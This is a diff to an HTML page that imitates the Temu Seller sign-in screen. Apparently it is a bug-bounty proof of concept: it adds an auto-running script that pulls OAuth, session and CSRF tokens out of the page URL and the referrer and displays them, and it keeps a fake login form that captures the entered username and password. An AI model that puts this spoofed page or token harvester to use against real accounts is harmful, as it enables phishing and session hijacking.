@@ -5,8 +5,8 @@
 <title>Sign In - Temu Seller</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-  .login-container { background: #ffffff; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 380px; text-align: center; border: 1px solid #e6e6e6; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+  .login-container { background: #ffffff; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 400px; text-align: center; border: 1px solid #e6e6e6; }
   .logo { font-size: 24px; font-weight: 700; color: #ff4646; margin-bottom: 8px; letter-spacing: -0.5px; }
   .logo span { color: #222; }
   .sub { color: #666; font-size: 14px; margin-bottom: 25px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
@@ -17,6 +17,9 @@
   .btn { background: #ff4646; color: white; border: none; padding: 14px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; margin-top: 5px; }
   .btn:hover { background: #e03535; }
   .alert-box { background: #fff3cd; color: #856404; padding: 10px; border-radius: 4px; margin-top: 10px; font-size: 13px; border: 1px solid #ffeeba; display: none; }
+  .token-box { background: #ffcccb; color: #a94442; padding: 10px; border-radius: 4px; margin: 15px 0; font-size: 13px; border: 1px solid #ebccd1; display: none; text-align: left; word-break: break-all; max-height: 200px; overflow-y: auto; }
+  .token-box.show { display: block; }
+  .token-box strong { color: #a94442; }
   .note { margin-top: 15px; font-size: 11px; color: #999; }
 </style>
 </head>
@@ -24,6 +27,12 @@
 <div class="login-container">
   <div class="logo">Temu <span>Seller</span></div>
   <div class="sub">Sign in to your seller account</div>
+
+  <!-- 🔥 TOKEN LEAK DETECTION ZONE (Auto-runs on page load) -->
+  <div id="tokenAlert" class="token-box">
+    <strong>🔥 TOKEN LEAK DETECTED!</strong><br>
+    <span id="tokenDetails"></span>
+  </div>
 
   <form onsubmit="return capture(event)">
     <div class="input-group">
@@ -42,7 +51,65 @@
 </div>
 
 <script>
-function capture(e) {
+  // ========================================================
+  // 1. DETECT TOKENS LEAKED VIA URL / REFERER (Auto-run)
+  // ========================================================
+  function detectLeakedTokens() {
+    const fullUrl = window.location.href;
+    const referrer = document.referrer;
+    let leaked = [];
+
+    // Common token patterns (OAuth, Session, CSRF, Temu-specific)
+    const patterns = [
+      /[?&](code|state|token|access_token|id_token|refresh_token|ticket|lpc_ticket|_b_m_tk|oauth_token|session|csrf|_csrf|xsrf|_token|nonce)=([^&?#]+)/gi,
+      /#(access_token|id_token|token)=([^&?#]+)/gi
+    ];
+
+    // Check the current URL (the attacker's page URL)
+    patterns.forEach(regex => {
+      let match;
+      while ((match = regex.exec(fullUrl)) !== null) {
+        leaked.push({ param: match[1], value: match[2], source: 'URL' });
+      }
+    });
+
+    // Check the Referrer URL (the Temu login page)
+    if (referrer) {
+      patterns.forEach(regex => {
+        let match;
+        while ((match = regex.exec(referrer)) !== null) {
+          leaked.push({ param: match[1], value: match[2], source: 'Referer' });
+        }
+      });
+    }
+
+    // Display results
+    const alertBox = document.getElementById('tokenAlert');
+    const details = document.getElementById('tokenDetails');
+
+    if (leaked.length > 0) {
+      alertBox.classList.add('show');
+      let html = '';
+      leaked.forEach(item => {
+        html += `🔸 <strong>${item.param}</strong> = <span style="color: #d9534f;">${item.value}</span> (found in <strong>${item.source}</strong>)<br>`;
+      });
+      details.innerHTML = html;
+
+      // Also log to console for your screenshots
+      console.log('🔥 LEAKED TOKENS DETECTED:');
+      console.table(leaked);
+    } else {
+      console.log('✅ No tokens leaked in URL or Referer (PoC page loaded directly).');
+    }
+  }
+
+  // Run detection on page load
+  window.addEventListener('load', detectLeakedTokens);
+
+  // ========================================================
+  // 2. CREDENTIAL CAPTURE (Original Feature)
+  // ========================================================
+  function capture(e) {
     e.preventDefault();
     var user = document.getElementById('username').value;
     var pass = document.getElementById('password').value;
@@ -54,7 +121,7 @@ function capture(e) {
     alert('Demo: Credentials Captured!\nUser: ' + user);
 
     return false;
-}
+  }
 </script>
 </body>
 </html>
